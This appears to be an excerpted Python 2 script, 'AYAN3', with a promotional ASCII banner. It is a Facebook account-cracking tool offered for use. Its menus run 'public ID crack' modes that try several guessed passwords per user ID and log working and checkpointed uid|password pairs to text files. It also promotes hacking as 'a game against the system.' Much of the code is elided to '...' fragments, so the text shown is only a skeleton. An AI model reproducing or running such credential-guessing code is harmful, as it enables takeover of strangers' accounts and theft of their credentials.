git clone https://github.com/Ayankhan01/AYAN3.git
...
\033[1;93m                 
            ...
            AAA           YYYYYYY       YYYYYYY           AAA               NNNNNNNN        NNNNNNNN     DDDDDDDDDDDDD                  AAA               DDDDDDDDDDDDD       XXXXXXX       XXXXXXX

              A:::A          Y:::::Y       Y:::::Y          A:::A              N:::::::N       N::::::N     D::::::::::::DDD              A:::A              D::::::::::::DDD    X:::::X       X:::::X

             A:::::A         Y:::::Y       Y:::::Y         A:::::A             N::::::::N      N::::::N     D:::::::::::::::DD           A:::::A             D:::::::::::::::DD  X:::::X       X:::::X

            A:::::::A        Y::::::Y     Y::::::Y        A:::::::A            N:::::::::N     N::::::N     DDD:::::DDDDD:::::D         A:::::::A            DDD:::::DDDDD:::::D X::::::X     X::::::X

           A:::::::::A       YYY:::::Y   Y:::::YYY       A:::::::::A           N::::::::::N    N::::::N       D:::::D    D:::::D       A:::::::::A             D:::::D    D:::::DXXX:::::X   X:::::XXX

          A:::::A:::::A         Y:::::Y Y:::::Y         A:::::A:::::A          N:::::::::::N   N::::::N       D:::::D     D:::::D     A:::::A:::::A            D:::::D     D:::::D  X:::::X X:::::X   

         A:::::A A:::::A         Y:::::Y:::::Y         A:::::A A:::::A         N:::::::N::::N  N::::::N       D:::::D     D:::::D    A:::::A A:::::A           D:::::D     D:::::D   X:::::X:::::X    

        A:::::A   A:::::A         Y:::::::::Y         A:::::A   A:::::A        N::::::N N::::N N::::::N       D:::::D     D:::::D   A:::::A   A:::::A          D:::::D     D:::::D    X:::::::::X     

       A:::::A     A:::::A         Y:::::::Y         A:::::A     A:::::A       N::::::N  N::::N:::::::N       D:::::D     D:::::D  A:::::A     A:::::A         D:::::D     D:::::D    X:::::::::X     

      A:::::AAAAAAAAA:::::A         Y:::::Y         A:::::AAAAAAAAA:::::A      N::::::N   N:::::::::::N       D:::::D     D:::::D A:::::AAAAAAAAA:::::A        D:::::D     D:::::D   X:::::X:::::X    

     A:::::::::::::::::::::A        Y:::::Y        A:::::::::::::::::::::A     N::::::N    N::::::::::N       D:::::D     D:::::DA:::::::::::::::::::::A       D:::::D     D:::::D  X:::::X X:::::X   

    A:::::AAAAAAAAAAAAA:::::A       Y:::::Y       A:::::AAAAAAAAAAAAA:::::A    N::::::N     N:::::::::N       D:::::D    D:::::DA:::::AAAAAAAAAAAAA:::::A      D:::::D    D:::::DXXX:::::X   X:::::XXX

   A:::::A             A:::::A      Y:::::Y      A:::::A             A:::::A   N::::::N      N::::::::N     DDD:::::DDDDD:::::DA:::::A             A:::::A   DDD:::::DDDDD:::::D X::::::X     X::::::X

  A:::::A               A:::::A  YYYY:::::YYYY  A:::::A               A:::::A  N::::::N       N:::::::N     D:::::::::::::::DDA:::::A               A:::::A  D:::::::::::::::DD  X:::::X       X:::::X

 A:::::A                 A:::::A Y:::::::::::Y A:::::A                 A:::::A N::::::N        N::::::N     D::::::::::::DDD A:::::A                 A:::::A D::::::::::::DDD    X:::::X       X:::::X

AAAAAAA                   AAAAAAAYYYYYYYYYYYYYAAAAAAA                   AAAAAAANNNNNNNN         NNNNNNN     DDDDDDDDDDDDD   AAAAAAA                   AAAAAAADDDDDDDDDDDDD       XXXXXXX       XXXXXXX
     ...
     \033[1;92m>> Author= AYANDADX

     \033[1;93m>> FACEBOOK= DADX

     \033[1;92m>> YouTube = AYAN TRICK

     \033[1;92m>> GITHUB= kos Gen
...
def main():
	...
	os.system('xdg-open https://youtube.com/channel/UCJmmhcQp5iS-B_HYleSCU_w')
...
def menu_option():
	...
	select = raw_input("\033[1;92mChoose option: \033[0;92m")
...
def crack_select():
	...
	if select =="1":
		...
		print("\t    \033[1;32mAUTO PASS PUBLIC ID CRACK\033[0;97m")
	...
	print("Hacking is not a crime its a game against the system.")
	...
	def main(arg):
		...
		try:
			...
			if "access_token" in q:
				...
				print(" \033[1;32m [DADX-ok] "+uid+" | "+pass1+"\033[0;97m")

				ok = open("AYANok.txt", "a")
				...
				if "www.facebook.com" in q["error_msg"]:
					...
					print(" \033[1;33m [DADX_CP] "+uid+" | "+pass1+"\033[0;97m")

					cp = open("AYANcp.txt", "a")
					...
					if "access_token" in q:
						...
						print(" \033[1;32m [DADX-OK] "+uid+" | "+pass2+"\033[0;97m")
						...
						if "www.facebook.com" in q["error_msg"]:
							...
							print(" \033[1;33m [DADX_CP] "+uid+" | "+pass2+"\033[0;97m")
							...
							if "access_token" in q:
								...
								print(" \033[1;32m [AYAN-OK] "+uid+" | "+pass3+"\033[0;97m")

								ok = open("DADXok.txt", "a")
								...
								if "www.facebook.com" in q["error_msg"]:
									...
									print(" \033[1;33m [AYAN_CP] "+uid+" | "+pass3+"\033[0;97m")

									cp = open("DADXcp.txt", "a")
									...
									if "access_token" in q:
										...
										print(" \033[1;32m [AYAN-OK] "+uid+" | "+pass4+"\033[0;97m")
										...
										if "www.facebook.com" in q["error_msg"]:
											...
											print(" \033[1;33m [Uzairkhan_CP] "+uid+" | "+pass4+"\033[0;97m")
											...
											if "access_token" in q:
												...
												print(" \033[1;32m [DADX-OK] "+uid+" | "+pass5+"\033[0;97m")
												...
												if "www.facebook.com" in q["error_msg"]:
													...
													print(" \033[1;33m [Uzairkhan_CP] "+uid+" | "+pass5+"\033[0;97m")
													...
													if "access_token" in q:
														...
														print(" \033[1;32m [Uzairkhan-OK] "+uid+" | "+pass6+"\033[0;97m")
														...
														if "www.facebook.com" in q["error_msg"]:
															...
															print(" \033[1;33m [Uzairkhan_CP] "+uid+" | "+pass6+"\033[0;97m")
															...
															if "access_token" in q:
																...
																print(" \033[1;32m [Uzairkhan-OK] "+uid+" | "+pass7+"\033[0;97m")
																...
																if "www.facebook.com" in q["error_msg"]:
																	...
																	print(" \033[1;33m [Uzairkhan_CP] "+uid+" | "+pass7+"\033[0;97m")
...
def choice_select():
	...
	if select =="1":
		...
		print("\t    \033[1;32mCHOICE PASS PUBLIC ID CRACK\033[0;97m")
			...
			if "access_token" in q:
				...
				if "www.facebook.com" in q["error_msg"]:
					...
					if "access_token" in q:
						...
						print(" \033[1;32m [AYAN-OK] "+uid+" | "+pass2+"\033[0;97m")
						...
						if "www.facebook.com" in q["error_msg"]:
							...
							print(" \033[1;33m [AYAN_CP] "+uid+" | "+pass2+"\033[0;97m")
									...
									if "access_token" in q:
										...
										if "www.facebook.com" in q["error_msg"]:
											...
											if "access_token" in q:
												...
												print(" \033[1;32m [AYAN-OK] "+uid+" | "+pass5+"\033[0;97m")
												...
												if "www.facebook.com" in q["error_msg"]:
													...
													print(" \033[1;33m [DADX_CP] "+uid+" | "+pass5+"\033[0;97m")
													...
													if "access_token" in q:
														...
														print(" \033[1;32m [AYANKHAN-OK] "+uid+" | "+pass6+"\033[0;97m")
														...
														if "www.facebook.com" in q["error_msg"]:
															...
															print(" \033[1;28m [AYAN_CP] "+uid+" | "+pass6+"\033[0;97m")
															...
															if "access_token" in q:
																...
																print(" \033[1;32m [DADX-OK] "+uid+" | "+pass7+"\033[0;97m")

																ok = open("AYANKHANok.txt", "a")
																...
																if "www.facebook.com" in q["error_msg"]:
																	...
																	print(" \033[1;33m [DADX_CP] "+uid+" | "+pass7+"\033[0;97m")

																	cp = open("AYANKHANcp.txt", "a")
